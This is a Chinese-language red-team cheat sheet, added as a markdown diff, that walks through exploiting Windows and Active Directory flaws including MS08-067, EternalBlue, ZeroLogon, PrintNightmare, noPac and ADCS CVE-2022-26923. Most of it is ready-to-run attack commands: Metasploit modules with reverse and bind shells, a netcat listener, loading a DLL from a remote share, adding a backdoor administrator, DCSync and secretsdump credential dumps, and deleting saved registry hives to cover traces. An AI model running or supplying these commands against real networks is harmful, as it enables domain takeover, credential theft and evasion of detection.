@@ -1,0 +1,307 @@
+## 0x01 **MS08-067**
+
+ **RPC远程缓冲区溢出导致的远程代码执行漏洞**
+
+适用：Windows 2000;XP;Server 2003;Vista;Server 2008;7 Beta
+
+    
+    
+    use exploit/windows/smb/ms08_067_netapi     #使用模块
+    set rhosts 172.16.5.27      #设置靶机ip
+    set lhost 172.16.5.28      #设置本地ip
+    set payload generic/shell_bind_tcp     #设置payload
+    exploit
+    
+
+## 0x02GPP(MS14-025)
+
+适用：2003、2008、2012以上已修复
+
+每当创建新的组策略首选项 (GPP) 时，都会在 SYSVOL 共享中创建一个带有该配置数据的 xml 文件，包括与 GPP
+关联的任何密码。为安全起见，Microsoft将密码存储为`cpassword`. 但随后微软在 MSDN
+上[公布了密钥！](https://msdn.microsoft.com/en-us/library/2c15cbf0-f086-4c74-8b70-1f2fa45dd4be.aspx)，微软在 2014
+年发布了一个补丁，阻止管理员将密码输入 GPP。但是该补丁对已经存在的这些易破解密码没有任何作用。
+
+接着我使用smbclient尝试访问该目录的文件，我注意到一个名为`Groups.xml`的文件
+
+    
+    
+    smbclient //10.10.10.100/Replication -U ""%""
+    
+
+![图片.png](https://image.3001.net/images/20221125/1669386717_6380d1dd8d7e103466b7e.png!small)
+
+![图片.png](https://image.3001.net/images/20221125/1669386722_6380d1e24017eafe8ef74.png!small)
+
+通过查看该文件的内容，我发现了SC_TGS用户及其GPP密码
+
+    
+    
+    #Kali上的工具gpp-decrypt可以用来解密：
+    gpp-decrypt "edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ"
+    
+
+## 0x03MS14-068
+
+PAC校验缺陷，导致可以伪造PAC，并且KDC可以正确解析放在TGT外（非预期位置）的PAC。以上两点导致可以从普通域用户提升到域管权限。
+
+    
+    
+    #impacket工具包的goldenPac.py
+    python goldenPac.py -dc-ip 192.168.107.146 -target-ip 192.168.107.146 test.com/user:password@dc.test.com
+    #-dc-ip 是主域控的ip地址
+    #-target-ip 也是主域控的ip地址
+    #test.com 是域名
+    #user是当前域用户
+    #user冒号后面是当前域用户的密码
+    #@ 后输入主域计算机名 比如:dc.test.com
+    -------------------------------------------------------------------------------------------------------------------    #会生成ccache票据
+    ms14-068.exe -u 域成员名@域名 -s 域成员sid -d 域控制器地址 -p 域成员密码
+    export KRB5CCNAME=ticket.ccache
+    python secretsdump.py -k -no-pass test5-2012.hack.org -just-dc
+    
+
+## 0x04 **EhernalBlue(MS17-010)**
+
+ **SMBv1 和 NBT 中的远程代码执行漏洞**
+
+适用：WindowsNT，Windows2000、Windows XP、Windows 2003、Windows Vista、Windows
+7、Windows 8，Windows 2008、Windows 2008 R2、Windows Server 2012 SP0。（包括但不限于）
+
+    
+    
+    use auxiliary/scanner/smb/smb_ms17_010             #扫描是否存在该漏洞
+    set rhosts 10.10.10.14    #设置目标主机的IP,也可以设置整个IP段
+    set threads 10
+    exploit
+    
+    
+    
+    use exploit/windows/smb/ms17_010_eternalblue    #漏洞利用
+    set rhosts 10.10.10.14                          #设置目标主机的IP,也可以设置整个IP段
+    set payload windows/x64/meterpreter/reverse_tcp
+    set lhost 10.10.10.147
+    set lport 4444
+    exploit
+    
+    
+    
+    use exploit/windows/smb/ms17_010_psexec    #漏洞利用
+     set payload windows/meterpreter/bind_tcp
+     set rhost 192.168.33.33
+     exploit
+    
+    
+    
+    use auxiliary/admin/smb/ms17_010_command    #漏洞利用
+    set rhosts=192.168.26.33.33
+    set COMMAND net user hack  hack123 /add
+    set COMMAND net localgroup administrators hack  /add
+    exploit
+    
+
+### 0x04SMBghost（CVE-2020-0796）
+
+https://github.com/ZecOps/CVE-2020-0796-RCE-POC
+
+SMB v3远程代码执⾏漏洞获取权限
+
+适用：Windows 10 1903-1909
+
+    
+    
+    nc -lnvp   <reverse_shell_port>
+    SMBleedingGhost.py <target_ip> <reverse_shell_ip> <reverse_shell_port>
+    
+
+## 0x05ZeroLogon（CVE-2020-1472）
+
+前提:拥有一个普通域用户
+
+原理：微软在进行AES加密运算过程中，使用了AES-CFB8模式并且错误的将IV设置为全零，这使得攻击者在明文(client
+challenge)、IV等要素可控的情况下，存在较高概率使得产生的密文为全零（1/256）。通过碰撞方法，攻击者便完成了域身份认证，修改krbtgt用户密码为空，从而进行DCsync。详细原理:[zerologon
+特权提升漏洞(CVE-2020-1472)原理分析与验证](https://mp.weixin.qq.com/s?__biz=MzI2NzY5MDI3NQ==&mid=2247487380&idx=2&sn=2723d6d6eca3b3b1460dbe7bedb860ca&chksm=eafa47d8dd8dcece7b0b01c331f750da994e7c6483e9839e2752ea830b59c72c72c9ea031e68&mpshare=1&scene=1&srcid=0915K0mh2x5HCSuWhim4a8lF&sharer_sharetime=1600248655858&sharer_shareid=603d3452a1da35dfaf9195077f79f3de&key=3f730bd43b5106bfcfc536175a58a4f9591d1b260793c8320f040377f9e45b3f7b1781c4506ae0c3fc8415c1b2f8d9435f1fded377146fc29d269caa557b9830bdeeb81c8686131660911572d1ada5ea854d9300322be78d605613b9f1bd019df785e35a2a1741b74c3f37802d1c6fd84fd1b01daa33a9697d6a2b667626c94c&ascene=1&uin=MjYzNzcxNDgzMw%3D%3D&devicetype=Windows+10+x64&version=62090529&lang=zh_CN&exportkey=Ay8gAj7ggbwWBs6jC8EQrCI%3D&pass_ticket=31feuN9eshIctUXUsMy%2Fwuj0mP%2BK04tjRZZR3Gpdd1gV5CwB6kJIS0W2DnYDEWGx&wx_header=0)
+
+适用：  
+Windows Server 2008 R2  
+Windows Server 2012、Windows Server 2012 R2  
+Windows Server 2016  
+Windows Server 2019、version 1903、1909、2004
+
+工具：https://github.com/mstxq17/cve-2020-1472
+
+    
+    
+    net group "domain controllers" /domain      #查询域控主机名
+    python3 cve-2020-1472-poc.py Motoo-DCSRV 192.168.159.149   #域控主机名   域控ip
+    python3 cve-2020-1472-exploit.py Motoo-DCSRV 192.168.159.149   #使用exploit将域控机器账号重置
+    python3 secretsdump.py Motoo.nc/Motoo-DCSRV$@192.168.159.149    -no-pass  #四个空格
+    python3 wmiexec.py -hashes aad3b435b51404eeaad3b435b51404ee:7c85389bc79a4eb184e620b6e8c37905 Motoo.nc/Administrator@192.168.159.149
+    #然后通过导出 sam system 等文件到本地，获取域控机器上本地保存之前的 hash 值用于恢复，不然就脱域了：
+    reg save HKLM\SYSTEM system.save
+    reg save HKLM\SAM sam.save
+    reg save HKLM\SECURITY security.save
+    get system.save                            #下载到比本地
+    get sam.save
+    get security.save 
+    del /f system.save                         #清理痕迹
+    del /f sam.save							#清理痕迹
+    del /f security.save					#清理痕迹
+    
+    #通过 sam.save、security.save、system.save  这些文件获得原来域控机器上的 Ntlm Hash 值，用于恢复密码：
+    python3 secretsdump.py -sam sam.save -system system.save -security security.save LOCAL   #提取原密码HASH
+    #通过拿到 $MACHINE.ACC: 的值，然后进行恢复：注意需要后半部分：
+    $MACHINE.ACC: 的值$MACHINE.ACC: aad3b435b51404eeaad3b435b51404ee:ce7b34c0f2c72d6cb03123ef5ff741ca
+    python3 reinstall_original_pw.py Motoo-DCSRV 192.168.159.149 ce7b34c0f2c72d6cb03123ef5ff741ca
+    #使用脚本来检测是否恢复密码成功：
+    python3 secretsdump.py Motoo.nc/Motoo-DCSRV$@192.168.159.149 -just-dc -no-pass
+    #或者还可以使用这个：注意四个空格
+    python3 secretsdump.py Motoo.nc/Motoo-DCSRV$@192.168.159.149    -no-pass
+    #至此整个攻击已经完成
+    
+    
+    
+    #mimikatz zerologon域：hacker.testlab
+    privilge::debug #权限提升
+    lsadump::zerologon /target:dc.hacker.testlab /account:dc$ #这个是poc
+    lsadump::zerologon /target:dc.hacker.testlab /account:dc$ /exploit  #这个是exp
+    lsadump::dcsync /domain:HACKER.LOCAL /dc:dc.hacker.testlab /user:krbtgt /authuser:dc$ /authdomain:HACKER /authpassword:"" /authntlm #再次空密码尝试
+    lsadump::postzerologon /target:192.168.43.100 /account:dc$ #恢复密码
+    
+
+## 0x06PrintNightmare（CVE-2021-1675）
+
+    
+    
+    利⽤CVE-2021-1675 打印机服务漏洞加载DLL执⾏代码。影响2008-2019。需要域内凭证，实测2016和2019可利⽤成功
+    使⽤impacket rpcdump.py脚本检测print spooler服务
+    
+
+适用：windows10（16-21） windows server （08-19）
+详细适用范围：http://k8gege.org/p/CVE-2021-1675.html
+
+https://github.com/cube0x0/CVE-2021-1675
+
+作用： **提权**
+
+使用rpcdump.py扫描潜在的易受攻击的主机，如果它返回下面其中的一个值，则它可能是易受攻击的。
+
+    
+    
+    pcdump.py @192.168.1.10 | egrep 'MS-RPRN|MS-PAR'
+    
+    Protocol: [MS-PAR]: Print System Asynchronous Remote Protocol 
+    Protocol: [MS-RPRN]: Print System Remote Protocol
+    
+    
+    
+    ./CVE-2021-1675.py hackit.local/domain_user:Pass123@192.168.1.10 '\\192.168.1.215\smb\addCube.dll'
+    ./CVE-2021-1675.py hackit.local/domain_user:Pass123@192.168.1.10 'C:\addCube.dll'
+    
+
+## 0x07NOpac(CVE-2021-42287&&CVE-2021-42278)
+
+适用：windows 2008-2022
+
+原理：CVE-2021-42278是一个安全绕过漏洞，允许通过修改机器账户的
+SAMAccountName属性来冒充域控制器。与标准用户账户相比，机器账户的名称末尾附加了“$”符号，但实际中，AD
+并没有验证域内机器账户中是否具有“$"，导致机器账户可以被假冒。  
+CVE-2021-42287是影响Kerberos特权属性证书 (PAC)的安全绕过漏洞，允许通过假冒域控制器，使密钥分发中心(KDC)创建高权限票据。  
+根据认证Kerberos
+协议，在请求服务票证前需要先签发TGT（票据授权凭证)。但是，当为活动目录中不存在的账户请求服务票证时，密钥分发中心(KDC)将在该账户名上附加“$”符号进行搜索。将这一行为与CVE-2021-42278结合，测试人员可以实现
+**域内权限提升**
+
+    
+    
+    python3 sam_the_admin.py hack.com/test:Aa123456 -dc-ip 192.168.11.250 -debug
+    python3 sam_the_admin.py hack.com/test:Aa123456 -dc-ip 192.168.11.250 -dump -debug #dcsync
+    python3 sam_the_admin.py hack.com/test:Aa123456 -dc-ip 192.168.11.250 -shell -debug
+    
+
+[https://github.com/WazeHell/sam-the-admin](https://links.jianshu.com/go?to=https%3A%2F%2Fgithub.com%2FWazeHell%2Fsam-the-admin)
+
+https://github.com/Ridter/noPac
+
+https://github.com/cube0x0/noPac
+
+    
+    
+    #https://github.com/cube0x0/noPac
+    #检测漏洞
+    noPac.exe scan -domain qaq.org -user admin -pass 'Aa123456'
+    #利用漏请求域管用户 cifs服务ST,用于访问共享
+    noPac.exe -domain qaq.org -user admin -pass 'Aa123456' /dc test5-2012.qaq.org /mAccount saulgoodman /mPassword passW0rd /service cifs /ptt
+    #利用漏洞请求域管用户 ldap服务ST,用于dcsync
+    noPac.exe -domain qaq.org -user admin -pass 'Aa123456' /dc test5-2012.qaq.org /mAccount saulgoodman /mPassword passW0rd /service ldap /ptt
+    #利用漏洞请求域管用户HOST/RPCSS服务ST，用于执行命令。可远程利用
+    noPac.exe -domain qaq.org -user admin -pass 'Aa123456' /dc test5-2012.qaq.org /mAccount saulgoodman /mPassword passW0rd /service HOST /ptt
+    noPac.exe -domain qaq.org -user admin -pass 'Aa123456' /dc test5-2012.qaq.org /mAccount saulgoodman /mPassword passW0rd /service RPCSS /ptt
+    #远程利用导出注入LDAP dcsync，先用MIMIkatz导出票据
+    python ticket_converter.py ticket.kirbi ticket.ccache #kirbi转换为impacket ccache票据格式
+    export KRB5CCNAME=ticket.ccache
+    python secretsdump.py -k -no-pass test5-2012.qaq.org -just-dc
+    
+
+## 0x08ADCS(CVE-2022-26923)
+
+ **漏洞适用：**
+
+ **影响范围** windows 2008-2022。
+
+    
+    
+    Windows Server 2012 R2        Windows RT 8.1             Windows 8.1                Windows Server 2016             Windows 10               Windows 10 Version 21H2      Windows 11              Windows Server, version 20H2
+    Windows 10 Version 20H2       Windows Server 2022     Windows 10 Version 21H1       Windows 10 Version 1909      Windows Server 2019          Windows 10 Version 1809
+    
+
+**漏洞原因：**  
+由于计算机账户中的dNSHostName不具有唯一性，可以对其进行伪造，冒充高权限的域空机器账户，实现 **权限提升** 的效果
+
+ **漏洞利用条件：**
+
+  1. 能够创建机器账户（或拥有某机器账户的控制权）
+
+  2. 对机器账户具有修改属性的权限
+
+    
+    
+    powershell Get-ChildItem Cert:\LocalMachine\Root\        #列出本地机器账户的证书,用于发现CA名称
+    
+    
+    
+    #https://github.com/CravateRouge/bloodyAD
+    # 创建机器账户
+    python3 bloodyAD.py -d redteam.lab -u ken -p '123.com' --host 10.10.2.20 addComputer CPT01 'Passw0rd'
+    
+    # 设置dNSHostName
+    python3 bloodyAD.py -d redteam.lab -u ken -p '123.com' --host 10.10.2.20 setAttribute 'CN=CPT01,CN=Computers,DC=redteam,DC=lab' DNSHostName '["DC2016.redteam.lab"]'
+    
+
+使用[Certipy](https://github.com/ly4k/Certipy)工具申请证书
+
+    
+    
+    certipy req 'redteam.lab/CPT01$:Passw0rd@DC2016.redteam.lab' -ca 'redteam-DC2016-CA' -template 'Machine'
+    
+
+同样使用[Certipy](https://github.com/ly4k/Certipy)工具申请票据
+
+    
+    
+    certipy auth -pfx dc2016.pfx -username DC2016$ -domain redteam.lab -dc-ip 10.10.2.20
+    
+
+获取到域控机器账户的Hash后，可以执行DCSync攻击
+
+    
+    
+    KRB5CCNAME=dc2016.ccache python3 secretsdump.py -k redteam.lab/DC2016\$@dc2016.redteam.lab -no-pass -just-dc
+    
+
+使用wmiexec等工具获取域控权权限
+
+    
+    
+    python3 wmiexec.py -hashes :83a140d89e42046e8daf5394d386a69a redteam.lab/administrator@10.10.2.20 -dc-ip 10.10.2.20
+    
+
